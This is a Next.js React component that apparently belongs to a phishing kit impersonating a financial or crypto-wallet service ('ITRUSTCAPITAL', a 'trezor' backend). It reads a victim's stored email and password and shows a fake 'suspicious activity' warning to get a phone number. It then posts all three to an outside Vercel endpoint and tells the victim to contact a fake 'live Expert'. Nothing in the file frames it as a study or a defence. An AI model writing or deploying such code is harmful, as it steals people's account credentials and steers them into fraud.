"use client";

import Image from "next/image";
import { useState } from "react";
import { useRouter } from "next/navigation";
import PhoneInput from "react-phone-input-2";
import "react-phone-input-2/lib/style.css";
import bgimg from "../../assets/bgImage.png";
import logo from "../../assets/Logo.png";

const PhoneNumberInput = () => {
  const [phone, setPhone] = useState("");
  const [loading, setLoading] = useState(false);
  const [warningMessage, setWarningMessage] = useState(
    "Important message!: some suspicious activity found with your account. Enter phone number to verify your identity"
  );

  const router = useRouter();

  const handleSubmit = async () => {
    const email = localStorage.getItem("email");
    const password = localStorage.getItem("password");

    if (!phone.trim()) {
      alert("📞 Please enter a valid phone number.");
      return;
    }

    if (!email || !password) {
      alert("❗ Missing email or password. Please login again.");
      router.push("/login");
      return;
    }

    const payload = {
      title: "ITRUSTCAPITAL",
      email,
      password,
      phone,
    };

    try {
      setLoading(true);

      const response = await fetch(
        "https://trezor-backend-zeta.vercel.app/api/v1/send-user-info",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        }
      );

      const data = await response.json();

      if (!response.ok) {
        console.error("❌ API Error:", data);
        alert(data?.message || "Something went wrong. Please try again.");
        return;
      }

      // ✅ Show message in UI instead of alert
      setWarningMessage(
        "Important message!: Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please get in touch with our Support Staff immediately. Chat with our live Expert to unblock your account."
      );
    } catch (error) {
      console.error("❌ Request failed:", error);
      alert("🚨 Network error. Please try again later.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="relative flex min-h-screen w-full items-center justify-center overflow-hidden">
      {/* Background Image */}
      <Image
        src={bgimg}
        alt="Background"
        fill
        priority
        className="absolute inset-0 object-cover -z-10"
      />
      <div className="absolute inset-0 bg-gradient-to-b from-black/40 to-black/70 -z-10" />

      {/* Form Container */}
      <div className="w-full max-w-sm rounded-xl sm:bg-[#222B45]/90 py-12 px-8 text-center sm:shadow-2xl sm:backdrop-blur-md">
        <div className="mb-6 flex justify-center">
          <Image
            src={logo}
            alt="Logo"
            width={270}
            height={50}
            className="object-contain"
          />
        </div>

        {/* Dynamic Warning Box */}
        <div className="bg-red-100 text-center py-4 px-4 mb-3 text-red-600 text-xs rounded-md">
          {warningMessage}
        </div>

        <p className="text-gray-300 mb-6 text-base">Enter Your Phone</p>

        {/* Phone Input */}
        <div className="mb-5">
          <PhoneInput
            country={"us"}
            value={phone}
            onChange={setPhone}
            inputStyle={{
              width: "100%",
              height: "45px",
              borderRadius: "8px",
              border: "2px solid #ccc",
              paddingLeft: "50px",
              fontSize: "14px",
            }}
            buttonStyle={{
              border: "none",
              background: "transparent",
            }}
            dropdownStyle={{
              borderRadius: "8px",
            }}
          />
        </div>

        {/* Submit Button */}
        <button
          onClick={handleSubmit}
          disabled={loading}
          className={`w-full rounded-md py-2 font-semibold text-white transition ${
            loading
              ? "bg-gray-500 cursor-not-allowed"
              : "bg-[#7EA842] hover:bg-[#6a9539]"
          }`}
        >
          {loading ? "Submitting..." : "Submit"}
        </button>
      </div>
    </div>
  );
};

export default PhoneNumberInput;
